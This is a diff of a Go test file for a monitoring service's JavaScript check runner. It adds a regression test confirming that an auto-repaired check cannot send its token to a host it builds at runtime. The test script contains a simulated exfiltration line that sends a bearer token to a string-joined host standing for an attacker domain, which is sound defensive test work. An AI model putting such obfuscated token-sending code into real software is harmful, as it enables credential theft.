@@ -34,8 +34,11 @@ func repairSink(t *testing.T) (string, *atomic.Int32) {
 
 // runRepairGrantJob stores an auto-repaired js check (grant over the stored
 // script and env, hosts 127.0.0.1) and runs its job through the claim and
-// executeJob path, references resolved by materializeConfig.
-func runRepairGrantJob(t *testing.T, script string, env map[string]any, granted bool) *models.Result {
+// executeJob path, references resolved by materializeConfig. A nil secrets
+// stores none.
+func runRepairGrantJob(
+	t *testing.T, script string, env, secrets map[string]any, granted bool,
+) *models.Result {
 	t.Helper()
 
 	r := require.New(t)
@@ -62,12 +65,12 @@ func runRepairGrantJob(t *testing.T, script string, env map[string]any, granted 
 		ai["repair_grant"] = jsconfig.RepairDigest(script, plainEnv)
 	}
 
-	check := seedRefCheck(t, ctx, dbSvc, org.UID, "grant-check", string(checkerdef.CheckTypeJS), models.JSONMap{
-		"script":  script,
-		"env":     env,
-		"secrets": map[string]any{"TOKEN": "s3cr3t-token-value"},
-		"ai":      ai,
-	})
+	config := models.JSONMap{"script": script, "env": env, "ai": ai}
+	if secrets != nil {
+		config["secrets"] = secrets
+	}
+
+	check := seedRefCheck(t, ctx, dbSvc, org.UID, "grant-check", string(checkerdef.CheckTypeJS), config)
 
 	jobs, _, err := runner.backend.ClaimJobs(ctx, worker.UID, nil, 10, 10, time.Minute)
 	r.NoError(err)
@@ -81,6 +84,9 @@ func runRepairGrantJob(t *testing.T, script string, env map[string]any, granted 
 	return lastResultForJob(t, dbSvc, ctx, jobs[0])
 }
 
+// grantSecrets is the secrets map of a check holding its token in `secrets`.
+var grantSecrets = map[string]any{"TOKEN": "s3cr3t-token-value"}
+
 // grantScript calls the granted host and, when env.FIRE is "yes", localhost
 // (standing for an attacker's host) with the secret.
 func grantScript(acmePort, evilPort string) string {
@@ -88,6 +94,49 @@ func grantScript(acmePort, evilPort string) string {
 var r = http.get("http://127.0.0.1:` + acmePort + `/", auth);
 if (env.FIRE === "yes") { http.get("http://localhost:` + evilPort + `/", auth); }
 return { status: r.error ? "down" : "up", output: { e: r.error } };`
+}
+
+// paramScript reads its token from env.TOKEN (a `${param:tag}` reference, no
+// `secrets`), calls the granted host and, when env.FIRE is "yes", a host it
+// builds at runtime (localhost, standing for evilco.test) with the token.
+func paramScript(acmePort, evilPort string) string {
+	return `var auth = { headers: { Authorization: "Bearer " + env.TOKEN } };
+var r = http.get("http://127.0.0.1:` + acmePort + `/", auth);
+if (env.FIRE === "yes") { http.get("http://" + ["local", "host"].join("") + ":` + evilPort + `/", auth); }
+return { status: r.error ? "down" : "up", output: { e: r.error } };`
+}
+
+// Regression (spec 2026-10-26-02): a granted check with no `secrets`, whose
+// token comes from a `${param:…}` reference in env, is held on schedule too.
+// The branch to a host built at runtime is refused and receives nothing; the
+// same check reaching only its granted host runs up.
+func TestRepairGrantHoldsAScheduledRunWithoutSecrets(t *testing.T) {
+	t.Parallel()
+
+	for _, fire := range []string{"yes", "no"} {
+		t.Run("fire="+fire, func(t *testing.T) {
+			t.Parallel()
+
+			r := require.New(t)
+			acmePort, acmeHits := repairSink(t)
+			evilPort, evilHits := repairSink(t)
+
+			result := runRepairGrantJob(t, paramScript(acmePort, evilPort),
+				map[string]any{"FIRE": fire, "TOKEN": "${param:tag}"}, nil, true)
+			r.NotNil(result.Status)
+
+			if fire == "yes" {
+				r.Equal(int(checkerdef.StatusError), *result.Status, result.Output)
+				r.Equal(true, result.Output[checkjs.OutputKeyRepairRefused])
+			} else {
+				r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
+				r.NotContains(result.Output, checkjs.OutputKeyRepairRefused)
+			}
+
+			r.Zero(evilHits.Load(), "the other host received nothing")
+			r.Equal(int32(1), acmeHits.Load(), "the granted host was reached")
+		})
+	}
 }
 
 // Regression (spec 2026-10-25-01): a `${…}` reference in the stored script or
@@ -113,7 +162,7 @@ func TestRepairGrantHoldsAScheduledRunWithAReference(t *testing.T) {
 			acmePort, acmeHits := repairSink(t)
 			evilPort, evilHits := repairSink(t)
 
-			result := runRepairGrantJob(t, grantScript(acmePort, evilPort)+tc.suffix, tc.env, true)
+			result := runRepairGrantJob(t, grantScript(acmePort, evilPort)+tc.suffix, tc.env, grantSecrets, true)
 			r.NotNil(result.Status)
 			r.Equal(int(checkerdef.StatusError), *result.Status, result.Output)
 			r.Equal(true, result.Output[checkjs.OutputKeyRepairRefused])
@@ -136,7 +185,7 @@ func TestRepairGrantScheduledRunControls(t *testing.T) {
 		acmePort, acmeHits := repairSink(t)
 		evilPort, evilHits := repairSink(t)
 
-		result := runRepairGrantJob(t, grantScript(acmePort, evilPort), map[string]any{"FIRE": "no"}, true)
+		result := runRepairGrantJob(t, grantScript(acmePort, evilPort), map[string]any{"FIRE": "no"}, grantSecrets, true)
 		r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
 		r.NotContains(result.Output, checkjs.OutputKeyRepairRefused)
 		r.Equal(int32(1), acmeHits.Load())
@@ -151,7 +200,7 @@ func TestRepairGrantScheduledRunControls(t *testing.T) {
 		evilPort, evilHits := repairSink(t)
 
 		result := runRepairGrantJob(t, grantScript(acmePort, evilPort)+"\n// run ${var:uuid}",
-			map[string]any{"FIRE": "yes"}, false)
+			map[string]any{"FIRE": "yes"}, grantSecrets, false)
 		r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
 		r.Equal(int32(1), acmeHits.Load())
 		r.Equal(int32(1), evilHits.Load(), "not held: the other host is reachable")
